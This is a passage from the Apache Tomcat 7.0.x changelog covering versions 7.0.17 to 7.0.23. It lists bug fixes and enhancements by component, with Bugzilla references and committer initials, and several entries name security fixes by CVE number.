`RemoteHostValve` valves) and `RequestFilter` (`RemoteAddrFilter`, `RemoteHostFilter` filters). It allows to use different HTTP response code when rejecting denied request. E.g. 404 instead of 403. (kkolinko) | | fix | Slightly improve performance of UDecoder.convert(). Align `%2f` handling between implementations. (kkolinko) | |  | **Coyote** | | --- | | | fix | [51881](https://bz.apache.org/bugzilla/show_bug.cgi?id=51881): Correctly complete Comet requests when the Comet END event is triggered asynchronously. (markt) | | --- | --- | | fix | [51905](https://bz.apache.org/bugzilla/show_bug.cgi?id=51905): Fix infinite loop in AprEndpoint shutdown if acceptor unlock fails. Reduce timeout before forcefully closing the socket from 30s to 10s. (kkolinko) | | fix | [51912](https://bz.apache.org/bugzilla/show_bug.cgi?id=51912): Fix HTTP header processing in NIO HTTP connector. (kkolinko) | | fix | Improve MimeHeaders.toString(). (kkolinko) | | fix | Fix threading issue in NIO connectors during shutdown that meant Comet connections were not always shut down cleanly. (markt) | | add | In HTTP connectors: self-guard against using a non-recycled input buffer. Requests will be rejected with response status 400. (kkolinko) | | fix | [52121](https://bz.apache.org/bugzilla/show_bug.cgi?id=52121): Fix possible output corruption when compression is enabled for a connector and the response is flushed. Includes a test case provided by David Marcks. (kkolinko/markt) | | fix | Improve multi-byte character handling in Coyote output for HTTP and AJP. (rjung) | | add | Refactor acceptor unlock code to reduce waiting time during connector pause and stop. (markt) | |  | **Jasper** | | --- | | | fix | Correct possible (but very small) memory leak when using maxLoadedJsps to limit the number of JSPs loaded at any one time. (markt) | | --- | --- | | fix | [52051](https://bz.apache.org/bugzilla/show_bug.cgi?id=52051): Better handling of missing resource problems with non-standard Servlet mappings so that a 404 response is returned to the client rather than a 500 response. (markt) | | fix | [52091](https://bz.apache.org/bugzilla/show_bug.cgi?id=52091): Address performance issues related to log creation in TagHandlerPool. Patch provided by Taiki Sugawara. (markt) | | code | Switch to using Collections.enumeration() rather than custom code that does the same thing. (markt) | |  | **Cluster** | | --- | | | fix | Avoid an unnecessary session ID change notice. Notice of changed session ID by JvmRouteBinderValve is unnecessary to BackupManager. In BackupManager, change of session ID is replicated by the call of a setId() method. (kfujino) | | --- | --- | | fix | Fix duplicate `resetDeltaRequest()` call in `DeltaSession.setId(String)`. (kkolinko) | | fix | Work around a [known JVM bug](http://bugs.sun.com/view_bug.do?bug_id=6427854) that is fixed in 1.7.0\_01 but still present in 1.6.0\_29 and was triggering intermittent unit test failure for `org.apache.catalina.tribes.group. TestGroupChannelMemberArrival.testMemberArrival`. The bug affects any components that use NIO although it was more likely to be observed in the clustering module than the HTTP or AJP NIO connector. (markt) | | add | When Context manager does not exist, no context manager message is replied in order to avoid timeout (default 60sec) of GET\_ALL\_SESSIONS sync phase. (kfujino) | | fix | Fix setting maxInactiveInterval, sessionIdLength and processExpiresFrequency for cluster managers. Use setter when setting maxActiveSessions. (rjung) | |  | **Web applications** | | --- | | | add | [50923](https://bz.apache.org/bugzilla/show_bug.cgi?id=50923): Use distinct background color for `code` tag in Tomcat documentation, for better readability. (kkolinko) | | --- | --- | | fix | [51630](https://bz.apache.org/bugzilla/show_bug.cgi?id=51630): Fix bug in async0 example that triggered an IllegalStateException in the application log. (markt) | | add | [52025](https://bz.apache.org/bugzilla/show_bug.cgi?id=52025): Add additional information regarding DriverManager, the service provider mechanism and memory leaks. (markt) | | fix | [52049](https://bz.apache.org/bugzilla/show_bug.cgi?id=52049): Improve setup instructions for running as a Windows service: remove references to specific Windows operating systems - it easily becomes dated; correct information on how a JRE is identified and selected. (markt) | | update | [52172](https://bz.apache.org/bugzilla/show_bug.cgi?id=52172): Clarify Tomcat build instructions. Patch provided by bmargulies. (kkolinko) | |  | **jdbc-pool** | | --- | | | fix | [52015](https://bz.apache.org/bugzilla/show_bug.cgi?id=52015): In jdbc-pool: JdbcInterceptor passes not 'this' but 'proxy' to `getNext().invoke`. (kfujino) | | --- | --- | | fix | In jdbc-pool: Improve handling of Errors that originate from methods invoked through reflection. In `TrapException` interceptor: rethrow Error as is, without wrapping it in a RuntimeException. (kkolinko) | | fix | In jdbc-pool: Unwrap InvocationTargetException if it is caught in `ResultSetProxy`, like we do it elsewhere. (kkolinko) | | fix | When building jdbc-pool from within Tomcat, use Tomcat's `output` directory location. This allows to move all build output away from the source tree. (kkolinko) | |  | **Other** | | --- | | | update | Update the package re-named copy of Commons BCEL (formerly Jakarta BCEL) to the latest code from Commons BCEL trunk. (markt) | | --- | --- | | code | Remove some unused code from the packaged renamed Commons BCEL. (markt) | | fix | [52059](https://bz.apache.org/bugzilla/show_bug.cgi?id=52059): In Windows uninstaller: Do not forget to remove Tomcat keys from 32-bit registry on deinstallation. (kkolinko) | | code | Start the process of deprecating unused and unnecessary code that will be removed in the next major release (8.0.x). (markt) | | update | Ignore `.git` directory when building the source distributive. (markt) | | update | Remove trailing whitespace from the default configuration files. (kkolinko) | | update | Improve `RUNNING.txt`. (kkolinko) | | update | Update optional Checkstyle library to 5.5. (kkolinko) | | add | In test suite: add `LoggingBaseTest` class to allow use of Tomcat logging configuration in tests that do not start Tomcat. (kkolinko) | | fix | In test suite: speed up `TestGroupChannelSenderConnections`. Remove 48 seconds worth of waits. (kkolinko) | | fix | [52148](https://bz.apache.org/bugzilla/show_bug.cgi?id=52148): Add tomcat-coyote.jar to catalina-tasks.xml as this JAR is now required by the Ant tasks. Patch provided by Volker Krebs. (markt) | | add | Add sample Apache Commons Daemon JSVC wrapper script `bin/daemon.sh` that can be used with `/etc/init.d`. (mturk) | | | |  | **Tomcat 7.0.22 (markt)** | **released 2011-10-01** | | --- | --- | | | **Catalina** | | --- | | | fix | [51550](https://bz.apache.org/bugzilla/show_bug.cgi?id=51550): An additional change that ensures any exceptions thrown by an Authenticator (or any other Valve configured for the Context) will be handled by the custom error pages for the Context if an appropriate error page is configured. (markt) | | --- | --- | | fix | [51580](https://bz.apache.org/bugzilla/show_bug.cgi?id=51580): Added a nicer error message when a WAR file contains filenames not properly encoded in UTF-8. (schultz) | | fix | [51687](https://bz.apache.org/bugzilla/show_bug.cgi?id=51687): Added (optional) protection against sun.java2d.Disposer thread pinning a WebappClassLoader into memory in the JreMemoryLeakPreventionListener. (schultz) | | add | [51741](https://bz.apache.org/bugzilla/show_bug.cgi?id=51741): Fixes a problem with Eclipse WTP "Serve modules without publishing" feature where applications failed to access resources when using getResource() on the classloader. (slaurent) | | fix | [51744](https://bz.apache.org/bugzilla/show_bug.cgi?id=51744): Prevent application code from closing the associated JNDI context while the application is running. (markt) | | fix | Correct a regression with the fix for [51653](https://bz.apache.org/bugzilla/show_bug.cgi?id=51653) that broke custom error pages for 4xx responses from the Authenticators. Error handling and request listeners are now handled in the StandardHostValve to ensure they wrap all Context level activity. (markt) | | fix | [51758](https://bz.apache.org/bugzilla/show_bug.cgi?id=51758): The digester (used for processing XML files) used the logger name `org.apache.commons.digester.Digester` rather than the expected `org.apache.tomcat.util.digester.Digester`. The digester has been changed to use the expected logger name. (markt/kkolinko) | | fix | [51774](https://bz.apache.org/bugzilla/show_bug.cgi?id=51774): Fix incorrect cached method signature that prevented session tracking modes from being defined in web.xml when running under a security manager. (markt) | | add | Add an annotation cache to the `DefaultInstanceManager` that improves performance for applications that make use of a lot of non-poolable objects (e.g. tag files) that need to be scanned for annotations when created. (markt) | | fix | Use the specification compliant request attribute of `javax.servlet.request.ssl_session_id` to access the SSL session ID and deprecated the Tomcat specific request attribute. (markt) | | add | Allow to overwrite the check for distributability of session attributes by session implementations. (rjung) | | update | Add Java 7 sunec.jar and zipfs.jar to the list of JARs to skip when scanning for TLDs and web fragments. (rjung) | | add | [51862](https://bz.apache.org/bugzilla/show_bug.cgi?id=51862): Added a `classesToInitialize` attribute to `JreMemoryLeakPreventionListener` to allow pre-loading of configurable classes to avoid some classloader leaks. (slaurent) | | fix | Reduce visibility of static field `ManagerBase.name` and make it final. (kkolinko) | | update | Add thread name to juli OneLineFormatter. (rjung) | | fix | Ensure Servlets that implement ContainerServlet always get treated as restricted. (markt) | | fix | [51872](https://bz.apache.org/bugzilla/show_bug.cgi?id=51872): Ensure that the access log always uses the correct value for the remote IP address associated with the request and that requests with multiple errors do not result in multiple entries in the access log. (markt) | |  | **Coyote** | | --- | | | code | Remove unused and undocumented socketCloseDelay attribute from NIO connector. (markt) | | --- | --- | | fix | [49683](https://bz.apache.org/bugzilla/show_bug.cgi?id=49683): Support separate connection and keep-alive timeouts for the APR/native connector HTTP and AJP connectors. (markt) | | code | Further re-factoring of the HTTP connectors to align the BIO, NIO and APR implementations. (markt) | | fix | [51794](https://bz.apache.org/bugzilla/show_bug.cgi?id=51794): Fix race condition in NioEndpoint. (fhanik) | | fix | [51811](https://bz.apache.org/bugzilla/show_bug.cgi?id=51811): Correct SSL configuration property name from sslImplemenationName to sslImplementationName. (rjung) | | fix | Fix a timing issue in NIO connector that meant that stopping a connector did not trigger a Comet END event if the associated processor was processing a READ event when the connector was stopped. (markt) | | fix | Replace unneeded call that iterated events queue in NioEndpoint.Poller. (kkolinko) | | fix | [51860](https://bz.apache.org/bugzilla/show_bug.cgi?id=51860): Fix issues if using NIO with a custom SSLImplementation. Based on a suggestion by Roman Tsirulnikov. (markt) | | fix | Allow the BIO HTTP connector to be used with SSL when running under Java 7. (markt) | | update | Don't send AJP CPONG if endpoint is already paused. (rjung) | | update | Align APR AJP connector with NIO one. Send 503 if endpoint is paused. (rjung) | | update | Accept AJP request even if endpoint is paused, if CPING was successful. (rjung) | |  | **Jasper** | | --- | | | fix | When unloading JSPs due to configuration of the `maxLoadedJsps` initialisation parameter, the unloading code was retaining a reference to the unloaded JSP preventing the associated class from being unloaded until the JSP that replaced it was itself unloaded. (markt) | | --- | --- | | fix | [51852](https://bz.apache.org/bugzilla/show_bug.cgi?id=51852): Correct two problems in the handling of varargs methods with the BeanELResolver. The first meant the wrong method was sometimes called and the second that an ArrayIndexOutOfBoundsExceptions could be thrown. Patch (including a test case) provided by Matt Benson. (markt) | |  | **Cluster** | | --- | | | update | Refactor cluster manager configuration: move handling of common attributes to base class. (kfujino, rjung) | | --- | --- | | add | New cluster manager attribute `sessionAttributeFilter` allows to filter which session attributes are replicated using a regular expression applied to the attribute name. (rjung) | |  | **Web applications** | | --- | | | fix | Correct the documentation for `connectionLinger` attribute for the AJP and HTTP connectors. (markt) | | --- | --- | | update | Document caveat of using `RemoteAddrValve` with IPv6 addresses. (kkolinko) | |  | **jdbc-pool** | | --- | | | fix | In jdbc-pool: Avoid IllegalArgumentException when setting maxActive less than or equal to 0. ArrayBlockingQueue doesn't allow capacity of 0 or less. (kfujino) | | --- | --- | | fix | [48392](https://bz.apache.org/bugzilla/show_bug.cgi?id=48392) ([r1169796](https://svn.apache.org/viewvc?view=rev&rev=1169796)): Fix typo in `StatementDecoratorInterceptor`. (fhanik) | | fix | [51139](https://bz.apache.org/bugzilla/show_bug.cgi?id=51139): In jdbc-pool: validatorClassName and suspectTimeout are ignored. In order to support them correctly, validatorClassName and suspectTimeout are added to a property list. (kfujino) | | fix | [51786](https://bz.apache.org/bugzilla/show_bug.cgi?id=51786): In jdbc-pool: Discarded connection is not active in a pool any longer. It removes from the active connection list. (kfujino) | | fix | [51871](https://bz.apache.org/bugzilla/show_bug.cgi?id=51871): Fix dependency in Maven POM file of tomcat-jbdc. (kkolinko) | |  | **Other** | | --- | | | update | Update the "test" target in the default build file to report a test failure only after all available connector variants (bio, nio, apr) have been tested. Do not stop after first connector that fails. (kkolinko) | | --- | --- | | update | [51887](https://bz.apache.org/bugzilla/show_bug.cgi?id=51887): When running the unit tests, use a fast but insecure random number source for session ID generation to reduce the delays caused by waiting for entropy. (kkolinko/markt) | | code | Code clean-up to further reduce the number of warnings reported by Eclipse, FindBugs and CheckStyle. (markt/kkolinko) | | | |  | **Tomcat 7.0.21 (markt)** | **released 2011-09-01** | | --- | --- | | | **Catalina** | | --- | | | add | [41718](https://bz.apache.org/bugzilla/show_bug.cgi?id=41718): Include a response body when sending a redirect. (markt) | | --- | --- | | add | [51640](https://bz.apache.org/bugzilla/show_bug.cgi?id=51640): Improve the memory leak prevention for leaks triggered by java.sql.DriverManager. (markt) | | fix | [51644](https://bz.apache.org/bugzilla/show_bug.cgi?id=51644): Fix annotation scanning for contexts with a multi-level context path such as /a/b. (markt) | | fix | Unregisters MBean of DataSource when web application stops. (kfujino) | | fix | [51650](https://bz.apache.org/bugzilla/show_bug.cgi?id=51650): Code clean-up. Patch provided by Felix Schumacher. (markt) | | fix | [51653](https://bz.apache.org/bugzilla/show_bug.cgi?id=51653): Move application level error page handling from the Host to the Context. This ensures that application error page handling is completed before the requestDestroyed event of any ServletRequestListener is fired. (markt) | | fix | [51654](https://bz.apache.org/bugzilla/show_bug.cgi?id=51654): Improve handling of invalid appBase settings for Host elements. (markt) | | fix | [51658](https://bz.apache.org/bugzilla/show_bug.cgi?id=51658): Fix possible NPE when logging a failed request. Based on a suggestion by Felix Schumacher. (markt) | | fix | [51688](https://bz.apache.org/bugzilla/show_bug.cgi?id=51688): JreMemoryLeakPreventionListener now protects against AWT thread creation. (schultz) | | fix | [51712](https://bz.apache.org/bugzilla/show_bug.cgi?id=51712): Ensure cache control headers are sent when appropriate even if the request is secure. Patch provided by Michael Zampani. (markt) | | fix | [51713](https://bz.apache.org/bugzilla/show_bug.cgi?id=51713): Improve message that is logged if there is an error in the value of `protocol` in a `Connector`. (kkolinko) | | fix | [51739](https://bz.apache.org/bugzilla/show_bug.cgi?id=51739): When using a landing page with FORM authentication ensure that the request has a valid HTTP method. (markt) | |  | **Coyote** | | --- | | | fix | [51641](https://bz.apache.org/bugzilla/show_bug.cgi?id=51641): Use correct key when removing processor instances from the connections map during clean-up. Patch provided by zhh. (markt) | | --- | --- | | fix | More changes to align the code between the different HTTP connectors. (markt) | | fix | Ensure AjpMessage headers are correct for the direction of the message. (markt) | | code | Code clean-up and re-factoring to reduce duplicate code in the AJP processor implementations. (markt) | | add | Detect incomplete AJP messages and reject the associated request if one is found. (markt) | | fix | [51698](https://bz.apache.org/bugzilla/show_bug.cgi?id=51698): Fix CVE-2011-3190. Prevent AJP message injection. (markt) | |  | **Jasper** | | --- | | | fix | [41673](https://bz.apache.org/bugzilla/show_bug.cgi?id=41673): Use platform line-endings when reporting compilation errors. (markt) | | --- | --- | |  | **Cluster** | | --- | | | add | [51736](https://bz.apache.org/bugzilla/show_bug.cgi?id=51736): Make rpcTimeout configurable in BackupManager. (kfujino) | | --- | --- | |  | **Web applications** | | --- | | | fix | [51649](https://bz.apache.org/bugzilla/show_bug.cgi?id=51649): Update the documentation web application to include the ThreadLocal leak prevention listener. (markt) | | --- | --- | |  | **jdbc-pool** | | --- | | | add | [51583](https://bz.apache.org/bugzilla/show_bug.cgi?id=51583) ([r1157874](https://svn.apache.org/viewvc?view=rev&rev=1157874), [r1162102](https://svn.apache.org/viewvc?view=rev&rev=1162102)): Fix shutdown delay in jdbc-pool. (fhanik/kkolinko) | | --- | --- | |  | **Other** | | --- | | | fix | [51558](https://bz.apache.org/bugzilla/show_bug.cgi?id=51558): Don't force the use of StandardManager when using any of the `Tomcat#addWebapp()` methods. (markt) | | --- | --- | | fix | [51704](https://bz.apache.org/bugzilla/show_bug.cgi?id=51704): Make use of `File#mkdirs()` more robust. (markt) | | | |  | **Tomcat 7.0.20 (markt)** | **released 2011-08-11** | | --- | --- | | | **Catalina** | | --- | | | fix | Corrected missing comma in the value of `jarsToSkip` property in `conf/catalina.properties` file, which caused tomcat-jdbc.jar and commons-beanutils\*.jar to be not ignored when scanning jars for tag libraries. (kkolinko) | | --- | --- | | fix | [41709](https://bz.apache.org/bugzilla/show_bug.cgi?id=41709): Provide exception messages where no message is provided currently for IllegalStateExcpetions triggered by calling HttpServletResponse methods when the response is committed. (markt) | | fix | [51509](https://bz.apache.org/bugzilla/show_bug.cgi?id=51509): Fix potential concurrency issue in CSRF prevention filter that may lead to some requests failing that should not. (markt) | | fix | [51518](https://bz.apache.org/bugzilla/show_bug.cgi?id=51518): Correct error in web.xml parsing rules for the <others/> tag when using absolute ordering. (markt) | | add | Move the SetCharacterEncoding filter from the examples web application to the `org.apache.catalina.filters` package so it is available for all web applications. (markt) | | fix | [51550](https://bz.apache.org/bugzilla/show_bug.cgi?id=51550): Internal errors in Tomcat components that process requests before they are passed to a web application, such as Authenticators, now return a 500 response rather than a 200 response. (markt) | | fix | [51555](https://bz.apache.org/bugzilla/show_bug.cgi?id=51555): Allow destroy() to be called on Lifecycle components that are in the initialized state. (markt) | | add | Add x-threadname pattern format token to ExtendedAccessLogValve to log the current request thread name. Based on a patch from Felix Schumacher. (timw) | | fix | [51584](https://bz.apache.org/bugzilla/show_bug.cgi?id=51584): Ensure file paths are encoded/decoded when translated to/from URLs when working with resources from a Context so special characters don't cause issues. (markt) | | fix | [51586](https://bz.apache.org/bugzilla/show_bug.cgi?id=51586): Expand error handling to cover anything that is recoverable (or might be recoverable) when loading classes during HandlesTypes processing. (markt) | | fix | [51588](https://bz.apache.org/bugzilla/show_bug.cgi?id=51588): Make it easier to extend the AccessLogValve to add support for custom elements. (markt) | | fix | Ensure that calls to StandardWrapper methods() that may trigger creation of a Servlet instance always do so in way that correctly instantiates a Servlet instance. (markt) | | fix | In JDBCStore: Committing connection if autoCommit is false. Make sure committed connection is returned to the pool if datasource is enabled. (kfujino) | | add | Split `condition` attribute of AccessLogValve into two, `conditionIf` and `conditionUnless`. Implement conditional logging that logs only if a request attribute is present. (kkolinko) | | fix | Allow to have several AccessLogValve instances in the same scope (e.g. in the same Context). (kkolinko) | | fix | [51610](https://bz.apache.org/bugzilla/show_bug.cgi?id=51610): If an unchecked exception occurs during a lifecycle transition (e.g. web application start) ensure that the component is put into the failed state. (markt) | | fix | [51614](https://bz.apache.org/bugzilla/show_bug.cgi?id=51614): Avoid calling store.load() and session.expire() twice in PersistentManager when expiring sessions. (kfujino) | | fix | Prevent spurious log warnings on container stop if a child component has previously failed. (markt) | | fix | Add missing getter and setter for the alwaysUseSession attribute of the authenticators. (markt) | |  | **Coyote** | | --- | | | fix | [49595](https://bz.apache.org/bugzilla/show_bug.cgi?id=49595): Prevent JVM crash with the AJP APR connector when flushing a closed socket. (jfclere) | | --- | --- | | fix | [50394](https://bz.apache.org/bugzilla/show_bug.cgi?id=50394): Return -1 instead of throwing an exception when encountering an EOF while processing an input stream with the HTTP APR connector. (jfclere) | | fix | Correctly handle a connectionTimeout value of -1 (no timeout) for the HTTP NIO and AJP NIO connectors. (markt) | | fix | [51503](https://bz.apache.org/bugzilla/show_bug.cgi?id=51503): Add additional validation that prevents a connector from starting if it does not have a port > 0. (markt) | | fix | [51557](https://bz.apache.org/bugzilla/show_bug.cgi?id=51557): Ignore HTTP headers that do not comply with RFC 2616 and use header names that are not tokens. (markt) | | add | Improve error handling for HTTP APR if an error occurs while using sendfile. (markt) | | fix | Ensure that when using sendfile, HTTP APR sockets are not added to multiple pollers. This may cause errors during shutdown. (markt) | | update | Set `reuse` flag of final AJP `END_RESPONSE` packet to `0` if we plan to close the connection. (rjung) | | update | Correctly indicate if socket is closing when calling recycle for the AJP NIO processor. Note since the flag is unused in this case there were no bugs triggered by the re-factoring error. (rjung) | |  | **Jasper** | | --- | | | fix | [51532](https://bz.apache.org/bugzilla/show_bug.cgi?id=51532): JSP files with dependencies in JARs were recompiled on every access leading to poor performance. (markt) | | --- | --- | | fix | [51544](https://bz.apache.org/bugzilla/show_bug.cgi?id=51544): Correctly resolve bean methods in EL so accessible methods that are overridden by inaccessible methods do not cause an IllegalAccessException. (markt) | |  | **Web applications** | | --- | | | fix | [41498](https://bz.apache.org/bugzilla/show_bug.cgi?id=41498): Add the allRolesMode attribute to the Realm configuration page in the documentation web application. (markt) | | --- | --- | | fix | [48997](https://bz.apache.org/bugzilla/show_bug.cgi?id=48997): Fixed some typos and correct cross-referencing to the HTTP Connector documentation with the SSL How-To page of the documentation web application. (markt) | | fix | [49122](https://bz.apache.org/bugzilla/show_bug.cgi?id=49122): Improvements and fixes for index page for ROOT web application. Based on a patch provided by pidster. (markt) | | fix | [51516](https://bz.apache.org/bugzilla/show_bug.cgi?id=51516): Correct documentation web application to show correct system property name for changing the name of the SSO session cookie. (markt) | | update | Configure the Manager and Host Manager web applications with the Set Character Encoding Filter to make the default request character encoding UTF-8 to improve i18n support. Note that best results will be obtained if the connector is also configured with `URIEncoding="UTF-8"`.(markt) | | update | Update the documentation web application to be even more explicit about the implications of setting the path attribute on a Context element in server.xml. (markt) | | fix | [51561](https://bz.apache.org/bugzilla/show_bug.cgi?id=51561): Update the Realm page within the documentation web application to recommend the use of digest.[bat|sh] to generate digests rather than calling RealmBase directly. (markt) | | fix | [51567](https://bz.apache.org/bugzilla/show_bug.cgi?id=51567): Update the class loading page of the documentation web application to include information on the search order for the common class loader when separate values are used for $CATALINA\_HOME and $CATALINA\_BASE. (markt) | | update | Improve class loading documentation and logging documentation. (kkolinko) | | add | Add information to the security page of the documentation web application for the ciphers attribute of the Connector element. (markt) | |  | **Other** | | --- | | | fix | [51503](https://bz.apache.org/bugzilla/show_bug.cgi?id=51503): Add additional validation to Windows installer that ensure that the shutdown port, HTTP port and AJP port are all specified during the install process. (markt) | | --- | --- | | fix | [51531](https://bz.apache.org/bugzilla/show_bug.cgi?id=51531): Update sample Eclipse classpath file to reflect updated ECJ jar. Patch provided by Ian Brandt. (markt) | | update | Convert Tomcat unit tests to JUnit 4. (kkolinko) | | update | Update optional CheckStyle library to 5.4. (kkolinko) | | update | Remove `resolveHosts` attribute from AccessLogValve configuration in the default `server.xml`. It was documented in 7.0.19 that it has no effect. (kkolinko) | | update | Simplify mapping for `jsp` servlet in the default `web.xml`. (kkolinko) | | fix | Correctly handle uninstall with the Windows installer if the service is installed with a name that contains a '-' character. (markt) | | fix | [51598](https://bz.apache.org/bugzilla/show_bug.cgi?id=51598): Prevent direct invocation of the Windows uninstaller without a service name from executing since the uninstall will not be complete. (markt) | | fix | Use Tomcat icon (cat) instead of Apache Commons Daemon (feather) one in the list of uninstallable programs on Windows. (kkolinko) | | update | Update to Apache Commons Daemon 1.0.7. (markt) | | fix | [51621](https://bz.apache.org/bugzilla/show_bug.cgi?id=51621): Add additional required JARs to the deployer distribution. (markt) | | fix | Fix a small number of warnings reported by FindBugs. (markt) | | update | Update to version 1.1.22 of the native component for the AJP APR/native and HTTP APR/native connectors. (markt) | | | |  | **Tomcat 7.0.19 (markt)** | **released 2011-07-19** | | --- | --- | | | **Catalina** | | --- | | | add | Add option to activate access log for unit tests. (rjung) | | --- | --- | | fix | Fix regression in year number formatting for AccessLogValve. (rjung) | | add | [46252](https://bz.apache.org/bugzilla/show_bug.cgi?id=46252): Allow to specify character set to be used to write the access log in AccessLogValve. (kkolinko) | | fix | [51494](https://bz.apache.org/bugzilla/show_bug.cgi?id=51494): Prevent an NPE when a long running request completes if the associated web application was destroyed while the request was processing. (markt) | | update | Allow choosing a locale for timestamp formatting in AccessLogValve. (rjung) | | fix | When generating access logs for errors, log at the Context/Host level if a Context or Host can be identified for the failed request. (markt) | | update | Create a directory for access log or error log (in AccessLogValve and in JULI FileHandler) automatically when it is specified as a part of the file name, e.g. in the `prefix` attribute. Earlier this happened only if it was specified with the `directory` attribute. (kkolinko) | | fix | Log a failure if access log file cannot be opened. (kkolinko) | | fix | Use en\_US as locale for timestamps in ExtendedAccessLogValve. (rjung) | | fix | Use en\_US as locale for creationdate in WebdavServlet. (rjung) | |  | **Coyote** | | --- | | | update | [51477](https://bz.apache.org/bugzilla/show_bug.cgi?id=51477): Support all SSL protocol combinations in the APR/native connector. This only works when using the native library version 1.1.21 or later, which is not yet released. (rjung) | | --- | --- | | update | Various refactorings to reduce code duplication and unnecessary code in the connectors. (markt) | | fix | Correct regression introduced in 7.0.17 that triggered 400 entries in the AccessLog when using the AJP/BIO connector. (markt) | | fix | Fix regression producing invalid MBean names when using IPV6 addresses for connectors. (rjung) | | fix | Add missing thread name in RequestProcessor when Servlet 3 Async is used. Fixes null thread name in access log and JMX MBean. (rjung) | | fix | Fix CVE-2011-2526. Protect against infinite loops (HTTP NIO) and crashes (HTTP APR) if sendfile is configured to send more data than is available in the file. (markt) | | fix | Prevent NPEs when a socket is closed in non-error conditions after sendfile processing when using the HTTP NIO connector. (markt) | |  | **Cluster** | | --- | | | update | Remove unnecessary server.xml parsing code for old cluster implementation that does not ship as part of Tomcat 7. (markt) | | --- | --- | |  | **Web applications** | | --- | | | add | Add additional information to the documentation web application on the benefits and remaining risks when running under a security manager. (markt) | | --- | --- | | fix | [51490](https://bz.apache.org/bugzilla/show_bug.cgi?id=51490): Correct broken HTML in JSP tag plugin examples and improve the <c:if> example to make failures more obvious. Based on suggestions by Charles. (markt) | | add | Document ExtendedAccessLogValve. (rjung) | | fix | Correct default value of `enableLookups` for connectors and mention, that `resolveHosts` for the AccessLogValve is replaced by `enableLookups`. (rjung) | |  | **jdbc-pool** | | --- | | | add | Include jdbc-pool into Tomcat release. (fhanik) | | --- | --- | |  | **Other** | | --- | | | update | Update to Apache Commons Daemon 1.0.6. (markt) | | --- | --- | | update | Update to Eclipse JDT Compiler 3.7. (markt) | | | |  | **Tomcat 7.0.18 (markt)** | **not released** | | --- | --- | | | **Catalina** | | --- | | | fix | Correct regression introduced in 7.0.17 that triggered an NPE if a CrawlerSessionManagerValve was used without setting crawlerUserAgents. (markt) | | --- | --- | | fix | [51466](https://bz.apache.org/bugzilla/show_bug.cgi?id=51466): Correct comment typos in HostManagerServlet. Patch provided by Felix Schumacher. (markt) | | fix | [51467](https://bz.apache.org/bugzilla/show_bug.cgi?id=51467): Invoke Thread.start() rather than Thread.run() so that listeners and filters are stopped in a separate thread rather than the current thread. Patch provided by Felix Schumacher. (markt) | | fix | [51473](https://bz.apache.org/bugzilla/show_bug.cgi?id=51473): Fix concatenation of values in `SecurityConfig.setSecurityProperty()`. (kkolinko) | | fix | Fix response.encodeURL() for the special case of an absolute URL with no path segment (http://name). (rjung) | |  | **Coyote** | | --- | | | fix | Correct regression caused by connector re-factoring that made AJP APR/native connector very unstable on Windows platforms. (markt) | | --- | --- | | fix | Correct regression caused by connector re-factoring that meant that sendfile data was not reset between pipe-lined HTTP requests. (markt) | |  | **Tribes** | | --- | | | update | Re-factor tests to align packages for tests with the classes under test. Start to convert non-JUnit tests to JUnit. Remove unnecessary code. (markt) | | --- | --- | | fix | Add synchronization to receiver socket binding to prevent test failures on Linux. (markt) | |  | **Other** | | --- | | | fix | More code clean-up to remove unused code and reduce IDE warnings. (markt/kkolinko) | | --- | --- | | update | Further improvements to the Windows installer. (markt/kkolinko) | | | |  | **Tomcat 7.0.17 (markt)** | **not released** | | --- | --- | | | **Catalina** | | --- | | | add | [48956](https://bz.apache.org/bugzilla/show_bug.cgi?id=48956): Add regular expression support for SSI. (markt) | | --- | --- | | add | [49165](https://bz.apache.org/bugzilla/show_bug.cgi?id=49165): Allow any time stamp formats supported by SimpleDateFormat in AccessLogValve. Support logging begin and/or end of request. (rjung) | | add | [50677](https://bz.apache.org/bugzilla/show_bug.cgi?id=50677): Allow system property variables to be used in the values of "common.loader" and other "\*.loader" properties in the `catalina.properties` file. (kkolinko) | | fix | [51376](https://bz.apache.org/bugzilla/show_bug.cgi?id=51376): When adding a Servlet via ServletContext#addServlet(String, Servlet), the Servlet was not initialized when the web application started and a load on startup value was set. (markt) | | fix | [51386](https://bz.apache.org/bugzilla/show_bug.cgi?id=51386): Correct code for processing @HandlesTypes annotations so only types of interest are reported to a ServletContainerInitializer. (markt) | | update | Add the Tomcat extras, ant-junit and Java Help Jars to the list of JARs to skip when scanning for TLDs and web fragments. (rjung) | | fix | The fix for bug [51310](https://bz.apache.org/bugzilla/show_bug.cgi?id=51310) caused a regression that re-introduced bug [49957](https://bz.apache.org/bugzilla/show_bug.cgi?id=49957) and deleted the contents of the work directory when Tomcat was shutdown. This fix ensures that the work directory for an application is not deleted when Tomcat is shutdown. (markt) | | fix | Correct issues with JULI's OneLineFormatter including: correctly re-using formatted timestamps when possible; thread-safety issues in timestamp formatting; correcting the output of any milliseconds to include leading zeros and formatting any parameters present. (kkolinko/markt/rjung) | | fix | [51395](https://bz.apache.org/bugzilla/show_bug.cgi?id=51395): Fix memory leak triggered when an application that includes a SAXParserFactory is the first web application to be loaded. (markt) | | fix | [51396](https://bz.apache.org/bugzilla/show_bug.cgi?id=51396): Correctly handle jsp-file entries in web.xml when the JSP servlet has been configured via code when embedding Tomcat. (markt) | | fix | [51400](https://bz.apache.org/bugzilla/show_bug.cgi?id=51400): Avoid known bottleneck in JVM when converting between Strings and bytes by always providing a Charset rather than an encoding name. Based on a patch by Dave Engberg. (markt) | | fix | [51401](https://bz.apache.org/bugzilla/show_bug.cgi?id=51401): Correctly initialise shared WebRuleSet instance used by the digesters that parse web.xml and prevent incorrect warnings about multiple occurrences of elements that are only allowed to appear once in web.xml and web-fragment.xml. (kfujino) | | add | [51403](https://bz.apache.org/bugzilla/show_bug.cgi?id=51403): Avoid NPE in JULI FileHandler if formatter is misconfigured. (kkolinko) | | fix | Previous improvements in JAR scanning performance introduced a start-up performance penalty for some use cases. This fix addresses those performance penalties while retaining the original improvements. (markt) | | add | [51418](https://bz.apache.org/bugzilla/show_bug.cgi?id=51418): Provide more control over Context creation when embedding Tomcat. Based on a patch by Benson Margulies. (markt/kkolinko) | | fix | Remove redundant copy of catalina.properties from o.a.c.startup. Generate this copy for inclusion in bin and src jars during the ant "compile" task. (rjung) | | fix | Use system properties loaded from catalina.properties via the class path in unit tests. (rjung) | | update | Improve JMX unit test. (rjung) | | fix | Fix IllegalStateException for JavaScript files when switching from Writer to OutputStream. The special handling of this case in the DefaultServlet was broken due to a MIME type change for JavaScript. (funkman) | | fix | Fix CVE-2011-2204. Prevent user passwords appearing in log files if a 